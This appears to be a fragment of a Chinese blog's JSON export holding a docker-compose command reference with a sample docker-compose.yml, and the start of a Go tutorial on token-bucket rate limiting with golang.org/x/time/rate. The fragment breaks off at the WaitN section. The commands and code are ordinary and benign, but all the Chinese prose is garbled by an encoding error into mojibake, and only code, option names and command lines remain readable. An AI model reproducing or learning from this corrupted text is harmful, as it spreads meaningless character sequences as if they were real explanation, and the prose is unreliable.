\n\nå‘½ä»¤ä½¿ç”¨è¯´æ˜\n\n\n\n8.1 `build` æ„å»ºï¼ˆé‡æ–°æ„å»ºï¼‰é¡¹ç›®ä¸­çš„æœåŠ¡å®¹å™¨\n\næ ¼å¼ä¸º `docker-compose build [options] [SERVICE...]`ã€‚\n\næœåŠ¡å®¹å™¨ä¸€æ—¦æ„å»ºåï¼Œå°†ä¼šå¸¦ä¸Šä¸€ä¸ªæ ‡è®°åï¼Œä¾‹å¦‚å¯¹äº web é¡¹ç›®ä¸­çš„ä¸€ä¸ª db å®¹å™¨ï¼Œå¯èƒ½æ˜¯ web_dbã€‚\n\nå¯ä»¥éšæ—¶åœ¨é¡¹ç›®ç›®å½•ä¸‹è¿è¡Œ `docker-compose build` æ¥é‡æ–°æ„å»ºæœåŠ¡ã€‚\n\né€‰é¡¹åŒ…æ‹¬ï¼š\n\n- `--force-rm` åˆ é™¤æ„å»ºè¿‡ç¨‹ä¸­çš„ä¸´æ—¶å®¹å™¨ã€‚\n- `--no-cache` æ„å»ºé•œåƒè¿‡ç¨‹ä¸­ä¸ä½¿ç”¨ cacheï¼ˆè¿™å°†åŠ é•¿æ„å»ºè¿‡ç¨‹ï¼‰ã€‚\n- `--pull` å§‹ç»ˆå°è¯•é€šè¿‡ pull æ¥è·å–æ›´æ–°ç‰ˆæœ¬çš„é•œåƒã€‚\n\n\n\n8.2 `config` éªŒè¯ Compose æ–‡ä»¶æ ¼å¼æ˜¯å¦æ­£ç¡®ï¼Œè‹¥æ­£ç¡®åˆ™æ˜¾ç¤ºé…ç½®ï¼Œè‹¥æ ¼å¼é”™è¯¯æ˜¾ç¤ºé”™è¯¯åŸå› \n\n\n\n8.3 `down` æ­¤å‘½ä»¤å°†ä¼šåœæ­¢ `up` å‘½ä»¤æ‰€å¯åŠ¨çš„å®¹å™¨ï¼Œå¹¶ç§»é™¤ç½‘ç»œ\n\n\n\n8.4 `exec` è¿›å…¥æŒ‡å®šçš„å®¹å™¨\n\n\n\n8.5 `help` è·å¾—ä¸€ä¸ªå‘½ä»¤çš„å¸®åŠ©\n\n\n\n8.6 `images` åˆ—å‡º Compose æ–‡ä»¶ä¸­åŒ…å«çš„é•œåƒ\n\n\n\n8.7 `kill` é€šè¿‡å‘é€ `SIGKILL` ä¿¡å·æ¥å¼ºåˆ¶åœæ­¢æœåŠ¡å®¹å™¨\n\næ ¼å¼ä¸º `docker-compose kill [options] [SERVICE...]`ã€‚\n\næ”¯æŒé€šè¿‡ `-s` å‚æ•°æ¥æŒ‡å®šå‘é€çš„ä¿¡å·ï¼Œä¾‹å¦‚é€šè¿‡å¦‚ä¸‹æŒ‡ä»¤å‘é€ `SIGINT` ä¿¡å·ã€‚\n\n```\n$ docker-compose kill -s SIGINT\n```\n\n\n\n8.8 `logs` æŸ¥çœ‹æœåŠ¡å®¹å™¨çš„è¾“å‡º\n\næ ¼å¼ä¸º `docker-compose logs [options] [SERVICE...]`ã€‚\n\né»˜è®¤æƒ…å†µä¸‹ï¼Œdocker-compose å°†å¯¹ä¸åŒçš„æœåŠ¡è¾“å‡ºä½¿ç”¨ä¸åŒçš„é¢œè‰²æ¥åŒºåˆ†ã€‚å¯ä»¥é€šè¿‡ `--no-color` æ¥å…³é—­é¢œè‰²ã€‚\n\nè¯¥å‘½ä»¤åœ¨è°ƒè¯•é—®é¢˜çš„æ—¶å€™ååˆ†æœ‰ç”¨ã€‚\n\n\n\n8.9 `pause` æš‚åœä¸€ä¸ªæœåŠ¡å®¹å™¨\n\næ ¼å¼ä¸º `docker-compose pause [SERVICE...]`ã€‚\n\n\n\n8.10 `port` æ‰“å°æŸä¸ªå®¹å™¨ç«¯å£æ‰€æ˜ å°„çš„å…¬å…±ç«¯å£\n\næ ¼å¼ä¸º `docker-compose port [options] SERVICE PRIVATE_PORT`ã€‚\n\né€‰é¡¹ï¼š\n\n- `--protocol=proto` æŒ‡å®šç«¯å£åè®®ï¼Œtcpï¼ˆé»˜è®¤å€¼ï¼‰æˆ–è€… udpã€‚\n- `--index=index` å¦‚æœåŒä¸€æœåŠ¡å­˜åœ¨å¤šä¸ªå®¹å™¨ï¼ŒæŒ‡å®šå‘½ä»¤å¯¹è±¡å®¹å™¨çš„åºå·ï¼ˆé»˜è®¤ä¸º 1ï¼‰ã€‚\n\n  \n\n8.11 `ps` åˆ—å‡ºé¡¹ç›®ä¸­ç›®å‰çš„æ‰€æœ‰å®¹å™¨\n\næ ¼å¼ä¸º `docker-compose ps [options] [SERVICE...]`ã€‚\n\né€‰é¡¹ï¼š\n\n- `-q` åªæ‰“å°å®¹å™¨çš„ ID ä¿¡æ¯ã€‚\n\n\n\n8.12 `pull` æ‹‰å–æœåŠ¡ä¾èµ–çš„é•œåƒ\n\næ ¼å¼ä¸º `docker-compose pull [options] [SERVICE...]`ã€‚\n\né€‰é¡¹ï¼š\n\n- `--ignore-pull-failures` å¿½ç•¥æ‹‰å–é•œåƒè¿‡ç¨‹ä¸­çš„é”™è¯¯ã€‚\n\n\n\n8.13 `push` æ¨é€æœåŠ¡ä¾èµ–çš„é•œåƒåˆ° Docker é•œåƒä»“åº“\n\n\n\n8.14 `restart` é‡å¯é¡¹ç›®ä¸­çš„æœåŠ¡\n\næ ¼å¼ä¸º `docker-compose restart [options] [SERVICE...]`ã€‚\n\né€‰é¡¹ï¼š\n\n- `-t, --timeout TIMEOUT` æŒ‡å®šé‡å¯å‰åœæ­¢å®¹å™¨çš„è¶…æ—¶ï¼ˆé»˜è®¤ä¸º 10 ç§’ï¼‰ã€‚\n\n\n\n8.15 `rm` åˆ é™¤æ‰€æœ‰ï¼ˆåœæ­¢çŠ¶æ€çš„ï¼‰æœåŠ¡å®¹å™¨\n\næ¨èå…ˆæ‰§è¡Œ `docker-compose stop` å‘½ä»¤æ¥åœæ­¢å®¹å™¨ã€‚\n\næ ¼å¼ä¸º `docker-compose rm [options] [SERVICE...]`ã€‚\n\né€‰é¡¹ï¼š\n\n- `-f, --force` å¼ºåˆ¶ç›´æ¥åˆ é™¤ï¼ŒåŒ…æ‹¬éåœæ­¢çŠ¶æ€çš„å®¹å™¨ã€‚ä¸€èˆ¬å°½é‡ä¸è¦ä½¿ç”¨è¯¥é€‰é¡¹ã€‚\n- `-v` åˆ é™¤å®¹å™¨æ‰€æŒ‚è½½çš„æ•°æ®å·ã€‚\n\n \n\n8.16 `run` åœ¨æŒ‡å®šæœåŠ¡ä¸Šæ‰§è¡Œä¸€ä¸ªå‘½ä»¤\n\næ ¼å¼ä¸º `docker-compose run [options] [-p PORT...] [-e KEY=VAL...] SERVICE [COMMAND] [ARGS...]`ã€‚\n\nä¾‹å¦‚ï¼š\n\n```\n$ docker-compose run ubuntu ping docker.com\n```\n\nå°†ä¼šå¯åŠ¨ä¸€ä¸ª ubuntu æœåŠ¡å®¹å™¨ï¼Œå¹¶æ‰§è¡Œ `ping docker.com` å‘½ä»¤ã€‚\n\né»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœå­˜åœ¨å…³è”ï¼Œåˆ™æ‰€æœ‰å…³è”çš„æœåŠ¡å°†ä¼šè‡ªåŠ¨è¢«å¯åŠ¨ï¼Œé™¤éè¿™äº›æœåŠ¡å·²ç»åœ¨è¿è¡Œä¸­ã€‚\n\n\n\nè¯¥å‘½ä»¤ç±»ä¼¼å¯åŠ¨å®¹å™¨åè¿è¡ŒæŒ‡å®šçš„å‘½ä»¤ï¼Œç›¸å…³å·ã€é“¾æ¥ç­‰ç­‰éƒ½å°†ä¼šæŒ‰ç…§é…ç½®è‡ªåŠ¨åˆ›å»ºã€‚\n\nä¸¤ä¸ªä¸åŒç‚¹ï¼š\n\n- ç»™å®šå‘½ä»¤å°†ä¼šè¦†ç›–åŸæœ‰çš„è‡ªåŠ¨è¿è¡Œå‘½ä»¤ï¼›\n- ä¸ä¼šè‡ªåŠ¨åˆ›å»ºç«¯å£ï¼Œä»¥é¿å…å†²çªã€‚\n\nå¦‚æœä¸å¸Œæœ›è‡ªåŠ¨å¯åŠ¨å…³è”çš„å®¹å™¨ï¼Œå¯ä»¥ä½¿ç”¨ `--no-deps` é€‰é¡¹ï¼Œä¾‹å¦‚\n\n```\n$ docker-compose run --no-deps web python manage.py shell\n```\n\nå°†ä¸ä¼šå¯åŠ¨ web å®¹å™¨æ‰€å…³è”çš„å…¶å®ƒå®¹å™¨ã€‚\n\né€‰é¡¹ï¼š\n\n- `-d` åå°è¿è¡Œå®¹å™¨ã€‚\n- `--name NAME` ä¸ºå®¹å™¨æŒ‡å®šä¸€ä¸ªåå­—ã€‚\n- `--entrypoint CMD` è¦†ç›–é»˜è®¤çš„å®¹å™¨å¯åŠ¨æŒ‡ä»¤ã€‚\n- `-e KEY=VAL` è®¾ç½®ç¯å¢ƒå˜é‡å€¼ï¼Œå¯å¤šæ¬¡ä½¿ç”¨é€‰é¡¹æ¥è®¾ç½®å¤šä¸ªç¯å¢ƒå˜é‡ã€‚\n- `-u, --user=\"\"` æŒ‡å®šè¿è¡Œå®¹å™¨çš„ç”¨æˆ·åæˆ–è€… uidã€‚\n- `--no-deps` ä¸è‡ªåŠ¨å¯åŠ¨å…³è”çš„æœåŠ¡å®¹å™¨ã€‚\n- `--rm` è¿è¡Œå‘½ä»¤åè‡ªåŠ¨åˆ é™¤å®¹å™¨ï¼Œ`d` æ¨¡å¼ä¸‹å°†å¿½ç•¥ã€‚\n- `-p, --publish=[]` æ˜ å°„å®¹å™¨ç«¯å£åˆ°æœ¬åœ°ä¸»æœºã€‚\n- `--service-ports` é…ç½®æœåŠ¡ç«¯å£å¹¶æ˜ å°„åˆ°æœ¬åœ°ä¸»æœºã€‚\n- `-T` ä¸åˆ†é…ä¼ª ttyï¼Œæ„å‘³ç€ä¾èµ– tty çš„æŒ‡ä»¤å°†æ— æ³•è¿è¡Œã€‚\n\n \n\n8.17 `scale` è®¾ç½®æŒ‡å®šæœåŠ¡è¿è¡Œçš„å®¹å™¨ä¸ªæ•°\n\næ ¼å¼ä¸º `docker-compose scale [options] [SERVICE=NUM...]`ã€‚\n\né€šè¿‡ `service=num` çš„å‚æ•°æ¥è®¾ç½®æ•°é‡ã€‚ä¾‹å¦‚ï¼š\n\n```\n$ docker-compose scale web=3 db=2\n```\n\nå°†å¯åŠ¨ 3 ä¸ªå®¹å™¨è¿è¡Œ web æœåŠ¡ï¼Œ2 ä¸ªå®¹å™¨è¿è¡Œ db æœåŠ¡ã€‚\n\nä¸€èˆ¬çš„ï¼Œå½“æŒ‡å®šæ•°ç›®å¤šäºè¯¥æœåŠ¡å½“å‰å®é™…è¿è¡Œå®¹å™¨ï¼Œå°†æ–°åˆ›å»ºå¹¶å¯åŠ¨å®¹å™¨ï¼›åä¹‹ï¼Œå°†åœæ­¢å®¹å™¨ã€‚\n\né€‰é¡¹ï¼š\n\n- `-t, --timeout TIMEOUT` åœæ­¢å®¹å™¨æ—¶å€™çš„è¶…æ—¶ï¼ˆé»˜è®¤ä¸º 10 ç§’ï¼‰ã€‚\n\n\n\n8.18 `start` å¯åŠ¨å·²ç»å­˜åœ¨çš„æœåŠ¡å®¹å™¨\n\næ ¼å¼ä¸º `docker-compose start [SERVICE...]`ã€‚\n\n\n\n8.19 `stop` åœæ­¢å·²ç»å¤„äºè¿è¡ŒçŠ¶æ€çš„å®¹å™¨ï¼Œä½†ä¸åˆ é™¤å®ƒ\n\né€šè¿‡ `docker-compose start` å¯ä»¥å†æ¬¡å¯åŠ¨è¿™äº›å®¹å™¨ã€‚\n\næ ¼å¼ä¸º `docker-compose stop [options] [SERVICE...]`ã€‚\n\né€‰é¡¹ï¼š\n\n- `-t, --timeout TIMEOUT` åœæ­¢å®¹å™¨æ—¶å€™çš„è¶…æ—¶ï¼ˆé»˜è®¤ä¸º 10 ç§’ï¼‰ã€‚\n\n\n\n8.20 `top` æŸ¥çœ‹å„ä¸ªæœåŠ¡å®¹å™¨å†…è¿è¡Œçš„è¿›ç¨‹\n\n \n\n8.21 `unpause` æ¢å¤å¤„äºæš‚åœçŠ¶æ€ä¸­çš„æœåŠ¡\n\næ ¼å¼ä¸º `docker-compose unpause [SERVICE...]`ã€‚\n\n\n\n8.22 `up` å¯åŠ¨ä¸€ä¸ªé¡¹ç›®\n\næ ¼å¼ä¸º `docker-compose up [options] [SERVICE...]`ã€‚\n\nè¯¥å‘½ä»¤ååˆ†å¼ºå¤§ï¼Œå®ƒå°†å°è¯•è‡ªåŠ¨å®ŒæˆåŒ…æ‹¬æ„å»ºé•œåƒï¼Œï¼ˆé‡æ–°ï¼‰åˆ›å»ºæœåŠ¡ï¼Œå¯åŠ¨æœåŠ¡ï¼Œå¹¶å…³è”æœåŠ¡ç›¸å…³å®¹å™¨çš„ä¸€ç³»åˆ—æ“ä½œã€‚\n\né“¾æ¥çš„æœåŠ¡éƒ½å°†ä¼šè¢«è‡ªåŠ¨å¯åŠ¨ï¼Œé™¤éå·²ç»å¤„äºè¿è¡ŒçŠ¶æ€ã€‚\n\nå¯ä»¥è¯´ï¼Œå¤§éƒ¨åˆ†æ—¶å€™éƒ½å¯ä»¥ç›´æ¥é€šè¿‡è¯¥å‘½ä»¤æ¥å¯åŠ¨ä¸€ä¸ªé¡¹ç›®ã€‚\n\n\n\né»˜è®¤æƒ…å†µï¼Œ`docker-compose up` å¯åŠ¨çš„å®¹å™¨éƒ½åœ¨å‰å°ï¼Œæ§åˆ¶å°å°†ä¼šåŒæ—¶æ‰“å°æ‰€æœ‰å®¹å™¨çš„è¾“å‡ºä¿¡æ¯ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿è¿›è¡Œè°ƒè¯•ã€‚\n\nå½“é€šè¿‡ `Ctrl-C` åœæ­¢å‘½ä»¤æ—¶ï¼Œæ‰€æœ‰å®¹å™¨å°†ä¼šåœæ­¢ã€‚\n\nå¦‚æœä½¿ç”¨ `docker-compose up -d`ï¼Œå°†ä¼šåœ¨åå°å¯åŠ¨å¹¶è¿è¡Œæ‰€æœ‰çš„å®¹å™¨ã€‚ä¸€èˆ¬æ¨èç”Ÿäº§ç¯å¢ƒä¸‹ä½¿ç”¨è¯¥é€‰é¡¹ã€‚\n\né»˜è®¤æƒ…å†µï¼Œå¦‚æœæœåŠ¡å®¹å™¨å·²ç»å­˜åœ¨ï¼Œ`docker-compose up` å°†ä¼šå°è¯•åœæ­¢å®¹å™¨ï¼Œç„¶åé‡æ–°åˆ›å»ºï¼ˆä¿æŒä½¿ç”¨ `volumes-from` æŒ‚è½½çš„å·ï¼‰ï¼Œä»¥ä¿è¯æ–°å¯åŠ¨çš„æœåŠ¡åŒ¹é… `docker-compose.yml` æ–‡ä»¶çš„æœ€æ–°å†…å®¹ã€‚å¦‚æœç”¨æˆ·ä¸å¸Œæœ›å®¹å™¨è¢«åœæ­¢å¹¶é‡æ–°åˆ›å»ºï¼Œå¯ä»¥ä½¿ç”¨ `docker-compose up --no-recreate`ã€‚è¿™æ ·å°†åªä¼šå¯åŠ¨å¤„äºåœæ­¢çŠ¶æ€çš„å®¹å™¨ï¼Œè€Œå¿½ç•¥å·²ç»è¿è¡Œçš„æœåŠ¡ã€‚å¦‚æœç”¨æˆ·åªæƒ³é‡æ–°éƒ¨ç½²æŸä¸ªæœåŠ¡ï¼Œå¯ä»¥ä½¿ç”¨ `docker-compose up --no-deps -d <SERVICE_NAME>` æ¥é‡æ–°åˆ›å»ºæœåŠ¡å¹¶åå°åœæ­¢æ—§æœåŠ¡ï¼Œå¯åŠ¨æ–°æœåŠ¡ï¼Œå¹¶ä¸ä¼šå½±å“åˆ°å…¶æ‰€ä¾èµ–çš„æœåŠ¡ã€‚\n\né€‰é¡¹ï¼š\n\n- `-d` åœ¨åå°è¿è¡ŒæœåŠ¡å®¹å™¨ã€‚\n- `--no-color` ä¸ä½¿ç”¨é¢œè‰²æ¥åŒºåˆ†ä¸åŒçš„æœåŠ¡çš„æ§åˆ¶å°è¾“å‡ºã€‚\n- `--no-deps` ä¸å¯åŠ¨æœåŠ¡æ‰€é“¾æ¥çš„å®¹å™¨ã€‚\n- `--force-recreate` å¼ºåˆ¶é‡æ–°åˆ›å»ºå®¹å™¨ï¼Œä¸èƒ½ä¸ `--no-recreate` åŒæ—¶ä½¿ç”¨ã€‚\n- `--no-recreate` å¦‚æœå®¹å™¨å·²ç»å­˜åœ¨äº†ï¼Œåˆ™ä¸é‡æ–°åˆ›å»ºï¼Œä¸èƒ½ä¸ `--force-recreate` åŒæ—¶ä½¿ç”¨ã€‚\n- `--no-build` ä¸è‡ªåŠ¨æ„å»ºç¼ºå¤±çš„æœåŠ¡é•œåƒã€‚\n- `-t, --timeout TIMEOUT` åœæ­¢å®¹å™¨æ—¶å€™çš„è¶…æ—¶ï¼ˆé»˜è®¤ä¸º 10 ç§’ï¼‰ã€‚\n\n\n\n8.23 `version` æ‰“å°ç‰ˆæœ¬ä¿¡æ¯\n\næ ¼å¼ä¸º `docker-compose version`ã€‚\n\n\n\n8.24 Compose æ¨¡æ¿æ–‡ä»¶\n\næ¨¡æ¿æ–‡ä»¶æ˜¯ä½¿ç”¨Â `Compose`Â çš„æ ¸å¿ƒï¼Œæ¶‰åŠåˆ°çš„æŒ‡ä»¤å…³é”®å­—ä¹Ÿæ¯”è¾ƒå¤šã€‚å¤§éƒ¨åˆ†æŒ‡ä»¤è·ŸÂ `docker run`Â ç›¸å…³å‚æ•°çš„å«ä¹‰éƒ½æ˜¯ç±»ä¼¼çš„ã€‚\n\n\n\né»˜è®¤çš„æ¨¡æ¿æ–‡ä»¶åç§°ä¸º `docker-compose.yml`ï¼Œæ ¼å¼ä¸º YAML æ ¼å¼ã€‚\n\n```\nversion: \"3\"\n\nservices:\n  webapp:\n    image: examples/web\n    ports:\n      - \"80:80\"\n    volumes:\n      - \"/data\"\n```\n\n\n\næ³¨æ„æ¯ä¸ªæœåŠ¡éƒ½å¿…é¡»é€šè¿‡ `image` æŒ‡ä»¤æŒ‡å®šé•œåƒæˆ– `build` æŒ‡ä»¤ï¼ˆéœ€è¦ Dockerfileï¼‰ç­‰æ¥è‡ªåŠ¨æ„å»ºç”Ÿæˆé•œåƒã€‚\n\nå¦‚æœä½¿ç”¨ `build` æŒ‡ä»¤ï¼Œåœ¨ `Dockerfile` ä¸­è®¾ç½®çš„é€‰é¡¹(ä¾‹å¦‚ï¼š`CMD`, `EXPOSE`, `VOLUME`, `ENV` ç­‰) å°†ä¼šè‡ªåŠ¨è¢«è·å–ï¼Œæ— éœ€åœ¨ `docker-compose.yml` ä¸­å†æ¬¡è®¾ç½®ã€‚\n\n","tags":["docker"],"categories":["docker"]},{"title":"ä»¤ç‰Œæ¡¶ç®—æ³•_golang_rateå¯¹é€Ÿåº¦è¿›è¡Œé™åˆ¶","url":"%2Fp%2Fe25fe1fc.html","content":"\n### é™æµç®—æ³•\n\né™æµç®—æ³•ï¼Œä¸€èˆ¬æœ‰æ¼æ¡¶ç®—æ³•å’Œä»¤ç‰Œæ¡¶ç®—æ³•ä¸¤ç§é™æµç®—æ³•ã€‚\n\n+ æ¼æ¡¶ç®—æ³•\n\næ¼æ¡¶ç®—æ³•(Leaky Bucket)æ˜¯ç½‘ç»œä¸–ç•Œä¸­æµé‡æ•´å½¢ï¼ˆTraffic Shapingï¼‰æˆ–é€Ÿç‡é™åˆ¶ï¼ˆRate Limitingï¼‰æ—¶ç»å¸¸ä½¿ç”¨çš„ä¸€ç§ç®—æ³•ï¼Œå®ƒçš„ä¸»è¦ç›®çš„æ˜¯æ§åˆ¶æ•°æ®æ³¨å…¥åˆ°ç½‘ç»œçš„é€Ÿç‡ï¼Œå¹³æ»‘ç½‘ç»œä¸Šçš„çªå‘æµé‡ã€‚æ¼æ¡¶ç®—æ³•æä¾›äº†ä¸€ç§æœºåˆ¶ï¼Œé€šè¿‡å®ƒï¼Œçªå‘æµé‡å¯ä»¥è¢«æ•´å½¢ä»¥ä¾¿ä¸ºç½‘ç»œæä¾›ä¸€ä¸ªç¨³å®šçš„æµé‡ã€‚\n\næ¼æ¡¶å¯ä»¥çœ‹ä½œæ˜¯ä¸€ä¸ªå¸¦æœ‰å¸¸é‡æœåŠ¡æ—¶é—´çš„å•æœåŠ¡å™¨é˜Ÿåˆ—ï¼Œå¦‚æœæ¼æ¡¶ï¼ˆåŒ…ç¼“å­˜ï¼‰æº¢å‡ºï¼Œé‚£ä¹ˆæ•°æ®åŒ…ä¼šè¢«ä¸¢å¼ƒã€‚ åœ¨ç½‘ç»œä¸­ï¼Œæ¼æ¡¶ç®—æ³•å¯ä»¥æ§åˆ¶ç«¯å£çš„æµé‡è¾“å‡ºé€Ÿç‡ï¼Œå¹³æ»‘ç½‘ç»œä¸Šçš„çªå‘æµé‡ï¼Œå®ç°æµé‡æ•´å½¢ï¼Œä»è€Œä¸ºç½‘ç»œæä¾›ä¸€ä¸ªç¨³å®šçš„æµé‡ã€‚\n\nå¦‚å›¾æ‰€ç¤ºï¼ŒæŠŠè¯·æ±‚æ¯”ä½œæ˜¯æ°´ï¼Œæ°´æ¥äº†éƒ½å…ˆæ”¾è¿›æ¡¶é‡Œï¼Œå¹¶ä»¥é™å®šçš„é€Ÿåº¦å‡ºæ°´ï¼Œå½“æ°´æ¥å¾—è¿‡çŒ›è€Œå‡ºæ°´ä¸å¤Ÿå¿«æ—¶å°±ä¼šå¯¼è‡´æ°´ç›´æ¥æº¢å‡ºï¼Œå³æ‹’ç»æœåŠ¡ã€‚\n\n![1](ä»¤ç‰Œæ¡¶ç®—æ³•_golang_rateå¯¹é€Ÿåº¦è¿›è¡Œé™åˆ¶/1.png)\n<!-- more -->\n+ ä»¤ç‰Œæ¡¶ç®—æ³•\n\nä»¤ç‰Œæ¡¶ç®—æ³•æ˜¯ç½‘ç»œæµé‡æ•´å½¢ï¼ˆTraffic Shapingï¼‰å’Œé€Ÿç‡é™åˆ¶ï¼ˆRate Limitingï¼‰ä¸­æœ€å¸¸ä½¿ç”¨çš„ä¸€ç§ç®—æ³•ã€‚å…¸å‹æƒ…å†µä¸‹ï¼Œä»¤ç‰Œæ¡¶ç®—æ³•ç”¨æ¥æ§åˆ¶å‘é€åˆ°ç½‘ç»œä¸Šçš„æ•°æ®çš„æ•°ç›®ï¼Œå¹¶å…è®¸çªå‘æ•°æ®çš„å‘é€ã€‚\n\nä»¤ç‰Œæ¡¶ç®—æ³•çš„åŸç†æ˜¯ç³»ç»Ÿä¼šä»¥ä¸€ä¸ªæ’å®šçš„é€Ÿåº¦å¾€æ¡¶é‡Œæ”¾å…¥ä»¤ç‰Œï¼Œè€Œå¦‚æœè¯·æ±‚éœ€è¦è¢«å¤„ç†ï¼Œåˆ™éœ€è¦å…ˆä»æ¡¶é‡Œè·å–ä¸€ä¸ªä»¤ç‰Œï¼Œå½“æ¡¶é‡Œæ²¡æœ‰ä»¤ç‰Œå¯å–æ—¶ï¼Œåˆ™æ‹’ç»æœåŠ¡ã€‚ä»åŸç†ä¸Šçœ‹ï¼Œä»¤ç‰Œæ¡¶ç®—æ³•å’Œæ¼æ¡¶ç®—æ³•æ˜¯ç›¸åçš„ï¼Œä¸€ä¸ªâ€œè¿›æ°´â€ï¼Œä¸€ä¸ªæ˜¯â€œæ¼æ°´â€ã€‚\n\n![2](ä»¤ç‰Œæ¡¶ç®—æ³•_golang_rateå¯¹é€Ÿåº¦è¿›è¡Œé™åˆ¶/2.png)\n\n+ æ¼æ¡¶ç®—æ³•å’Œä»¤ç‰Œæ¡¶ç®—æ³•çš„é€‰æ‹©\n\næ¼æ¡¶ç®—æ³•ä¸ä»¤ç‰Œæ¡¶ç®—æ³•åœ¨è¡¨é¢çœ‹èµ·æ¥ç±»ä¼¼ï¼Œå¾ˆå®¹æ˜“å°†ä¸¤è€…æ··æ·†ã€‚ä½†äº‹å®ä¸Šï¼Œè¿™ä¸¤è€…å…·æœ‰æˆªç„¶ä¸åŒçš„ç‰¹æ€§ï¼Œä¸”ä¸ºä¸åŒçš„ç›®çš„è€Œä½¿ç”¨ã€‚\n\næ¼æ¡¶ç®—æ³•ä¸ä»¤ç‰Œæ¡¶ç®—æ³•çš„åŒºåˆ«åœ¨äºï¼Œæ¼æ¡¶ç®—æ³•èƒ½å¤Ÿå¼ºè¡Œé™åˆ¶æ•°æ®çš„ä¼ è¾“é€Ÿç‡ï¼Œä»¤ç‰Œæ¡¶ç®—æ³•èƒ½å¤Ÿåœ¨é™åˆ¶æ•°æ®çš„å¹³å‡ä¼ è¾“é€Ÿç‡çš„åŒæ—¶è¿˜å…è®¸æŸç§ç¨‹åº¦çš„çªå‘ä¼ è¾“ã€‚\n\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ¼æ¡¶ç®—æ³•ä¸èƒ½å¤Ÿæœ‰æ•ˆåœ°ä½¿ç”¨ç½‘ç»œèµ„æºï¼Œå› ä¸ºæ¼æ¡¶çš„æ¼å‡ºé€Ÿç‡æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥å³ä½¿ç½‘ç»œä¸­æ²¡æœ‰å‘ç”Ÿæ‹¥å¡ï¼Œæ¼æ¡¶ç®—æ³•ä¹Ÿä¸èƒ½ä½¿æŸä¸€ä¸ªå•ç‹¬çš„æ•°æ®æµè¾¾åˆ°ç«¯å£é€Ÿç‡ã€‚å› æ­¤ï¼Œæ¼æ¡¶ç®—æ³•å¯¹äºå­˜åœ¨çªå‘ç‰¹æ€§çš„æµé‡æ¥è¯´ç¼ºä¹æ•ˆç‡ã€‚è€Œä»¤ç‰Œæ¡¶ç®—æ³•åˆ™èƒ½å¤Ÿæ»¡è¶³è¿™äº›å…·æœ‰çªå‘ç‰¹æ€§çš„æµé‡ã€‚é€šå¸¸ï¼Œæ¼æ¡¶ç®—æ³•ä¸ä»¤ç‰Œæ¡¶ç®—æ³•ç»“åˆèµ·æ¥ä¸ºç½‘ç»œæµé‡æä¾›æ›´é«˜æ•ˆçš„æ§åˆ¶ã€‚\n\n\n\n### golang rate.Limiter\n\n```\nfunc NewLimiter(r Limit, b int) *Limiter {\n\treturn &Limiter{\n\t\tlimit: r,\n\t\tburst: b,\n\t}\n}\n```\nLimteré™åˆ¶æ—¶é—´çš„å‘ç”Ÿé¢‘ç‡ï¼Œé‡‡ç”¨ä»¤ç‰Œæ± çš„ç®—æ³•å®ç°ã€‚è¿™ä¸ªæ± å­ä¸€å¼€å§‹å®¹é‡ä¸ºbï¼Œè£…æ»¡bä¸ªä»¤ç‰Œï¼Œç„¶åæ¯ç§’å¾€é‡Œé¢å¡«å……rä¸ªä»¤ç‰Œã€‚ \n\nç”±äºä»¤ç‰Œæ± ä¸­æœ€å¤šæœ‰bä¸ªä»¤ç‰Œï¼Œæ‰€ä»¥ä¸€æ¬¡æœ€å¤šåªèƒ½å…è®¸bä¸ªäº‹ä»¶å‘ç”Ÿï¼Œä¸€ä¸ªäº‹ä»¶èŠ±è´¹æ‰ä¸€ä¸ªä»¤ç‰Œã€‚\n\n\n```\nl := rate.NewLimiter(1, 3) \n//ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ¯ç§’å‘ç”Ÿå¤šå°‘æ¬¡äº‹ä»¶ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯æœ€å¤§å¯è¿è¡Œå¤šå°‘ä¸ªäº‹ä»¶\n```\n\n\n### Allow/AllowN å½“æ²¡æœ‰å¯ç”¨äº‹ä»¶æ—¶ï¼Œè¿”å›false\n\nAllowNæ ‡è¯†åœ¨æ—¶é—´nowçš„æ—¶å€™ï¼Œnä¸ªäº‹ä»¶æ˜¯å¦å¯ä»¥åŒæ—¶å‘ç”Ÿ(ä¹Ÿæ„æ€å°±æ˜¯nowçš„æ—¶å€™æ˜¯å¦å¯ä»¥ä»ä»¤ç‰Œæ± ä¸­å–nä¸ªä»¤ç‰Œ)ã€‚å¦‚æœä½ éœ€è¦åœ¨äº‹ä»¶è¶…å‡ºé¢‘ç‡çš„æ—¶å€™ä¸¢å¼ƒæˆ–è·³è¿‡äº‹ä»¶ï¼Œå°±ä½¿ç”¨AllowN,å¦åˆ™ä½¿ç”¨Reserveæˆ–Wait.\n\n\n```\npackage main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n\n\t\"golang.org/x/time/rate\"\n)\n\nfunc main() {\n\tl := rate.NewLimiter(1, 3) //åˆšå¼€å§‹æœ‰3ä¸ª, ä¸€ç§’å¡«1ä¸ª\n\n\tfor {\n\t\tif l.AllowN(time.Now(), 1) { //å½“å‰ä»ä»¤ç‰Œæ± å–å‡º n ä¸ªä»¤ç‰Œ\n\t\t\tfmt.Println(time.Now().Format(\"04:05.000\")) //å…ˆæŠŠæ± å­çš„3ä¸ªæ¶ˆè€—å®Œæ¯•, ä»¥å1ç§’è¿›å…¥ä»¤ç‰Œæ± ä¸€ä¸ª\n\t\t} else {\n\t\t\ttime.Sleep(1 * time.Second / 10)\n\t\t\tfmt.Println(time.Now().Format(\"Second 04:05.000\"))\n\t\t}\n\t}\n}\n\n\n\n43:32.534\n43:32.534\n43:32.534\nSecond 43:32.635\nSecond 43:32.737\nSecond 43:32.838\nSecond 43:32.938\nSecond 43:33.039\nSecond 43:33.144\nSecond 43:33.249\nSecond 43:33.350\nSecond 43:33.451\nSecond 43:33.552\n43:33.552\nSecond 43:33.653\nSecond 43:33.753\nSecond 43:33.854\nSecond 43:33.955\nSecond 43:34.055\n```\n\n\n\n### Wait/WaitN å½“æ²¡æœ‰å¯ç”¨äº‹ä»¶æ—¶ï¼Œå°†é˜»å¡ç­‰å¾…\n\nWaitN é˜»å¡å½“å‰ç›´åˆ°limitå…è®¸nä¸ªäº‹ä»¶çš„å‘ç”Ÿã€‚\n\n - 